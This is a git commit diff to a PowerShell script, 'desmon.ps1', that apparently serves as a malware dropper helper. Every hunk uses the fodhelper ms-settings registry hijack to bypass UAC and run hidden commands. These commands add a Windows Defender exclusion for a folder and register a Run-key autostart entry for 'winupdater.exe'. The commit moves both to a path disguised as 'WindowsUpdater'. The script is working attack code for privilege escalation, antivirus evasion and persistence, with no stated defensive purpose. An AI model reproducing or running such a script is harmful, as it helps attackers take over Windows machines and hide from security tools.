5aeaa853b1b185c180cdce7849a94be03f32939e
Prevail9 <136839533+Prevail9@users.noreply.github.com>
2023-07-26 14:32:41 +0200

    Update desmon.ps1

--- desmon.ps1
+++ desmon.ps1
@@ -1,4 +1,4 @@
-New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -WindowStyle hidden -c Add-MpPreference -ExclusionPath 'C:\Users\Public\Public Presentations' -Force" -Force
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -WindowStyle hidden -c Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowsUpdater' -Force" -Force
 New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
 fodhelper
 
@@ -6,6 +6,6 @@ Start-Sleep -Seconds 0.8
 
 Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 
-New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -WindowStyle hidden New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name 'winupdater' -Value 'C:\Users\Public\Public Presentations\winupdater.exe' -Force -PropertyType 'String'" -Force
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -WindowStyle hidden New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name 'winupdater' -Value 'C:\ProgramData\WindowsUpdater\winupdater.exe' -Force -PropertyType 'String'" -Force
 New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
 fodhelper
